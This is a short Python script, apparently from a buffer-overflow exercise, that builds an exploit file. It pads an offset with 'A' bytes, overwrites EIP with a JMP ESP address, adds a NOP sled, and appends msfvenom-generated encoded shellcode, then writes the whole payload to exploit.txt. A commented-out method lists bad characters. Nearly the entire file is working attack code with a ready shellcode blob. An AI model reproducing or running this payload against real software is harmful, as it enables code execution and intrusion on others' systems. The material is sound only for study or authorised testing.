#!/usr/bin/python

#This script includes two options of generating shellcode that exploits a Buffer Overflow vulnerability.
#1.Generate the offset, RET address in the EIP register, and NOPs needed for dealing with the decoding routine of shikata in this script and write the actual shellcode into exploit.txt seperately (use msfvenom and exclude bad chars)
#2.Write the whole payload (including shellcode) into exploit.txt

#Method 1
#Write raw binary hex values to a file.
list_1 = [65 for x in range(0,1308)] #Offset before EIP
list_EIP = [186, 17, 128, 20] #Reverse dec representation of the address of a JMP ESP instruction
list_NOP = [144 for x in range(0,9)] #NOPs to deal with changes by shikata decoding routine
#list_2 = [y for y in range(1,256)] #Placeholder for shellcode
#Dec of all the bad chars
#list_2.remove(10)
#list_2.remove(18)
#list_2.remove(26)
#list_2.remove(78)
#list_2.remove(177)
#list_2.remove(213)
#list = list_1 + list_EIP + list_NOP #+ list_2
#byte_list = bytes(list)
#with open("exploit.txt", "wb") as binary_file:
    #binary_file.write(byte_list)

#Method 2
offset = "\x41"*1251
EIP = "\xba\x11\x2b\x14"
NOP = "\x90"*10
#shellcode generated via msfvenom
payload = "\x31\xc9\x83\xe9\xd0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
payload += "\x39\xf0\xfd\x21\x83\xee\xfc\xe2\xf4\xc5\x18\x7f\x21\x39\xf0"
payload += "\x9d\xa8\xdc\xc1\x3d\x45\xb2\xa0\xcd\xaa\x6b\xfc\x76\x73\x2d"
payload += "\x7b\x8f\x09\x36\x47\xb7\x07\x08\x0f\x51\x1d\x58\x8c\xff\x0d"
payload += "\x19\x31\x32\x2c\x38\x37\x1f\xd3\x6b\xa7\x76\x73\x29\x7b\xb7"
payload += "\x1d\xb2\xbc\xec\x59\xda\xb8\xfc\xf0\x68\x7b\xa4\x01\x38\x23"
payload += "\x76\x68\x21\x13\xc7\x68\xb2\xc4\x76\x20\xef\xc1\x02\x8d\xf8"
payload += "\x3f\xf0\x20\xfe\xc8\x1d\x54\xcf\xf3\x80\xd9\x02\x8d\xd9\x54"
payload += "\xdd\xa8\x76\x79\x1d\xf1\x2e\x47\xb2\xfc\xb6\xaa\x61\xec\xfc"
payload += "\xf2\xb2\xf4\x76\x20\xe9\x79\xb9\x05\x1d\xab\xa6\x40\x60\xaa"
payload += "\xac\xde\xd9\xaf\xa2\x7b\xb2\xe2\x16\xac\x64\x9a\xfc\xac\xbc"
payload += "\x42\xfd\x21\x39\xa0\x95\x10\xb2\x9f\x7a\xde\xec\x4b\x0d\x94"
payload += "\x9b\xa6\x95\x87\xac\x4d\x60\xde\xec\xcc\xfb\x5d\x33\x70\x06"
payload += "\xc1\x4c\xf5\x46\x66\x2a\x82\x92\x4b\x39\xa3\x02\xf4\x5a\x9d"
payload += "\x99\x0f\x5c\x88\x98\x21"

shellcode = offset+EIP+NOP +payload
with open("exploit.txt", "wt") as shellfile:
    shellfile.write(shellcode)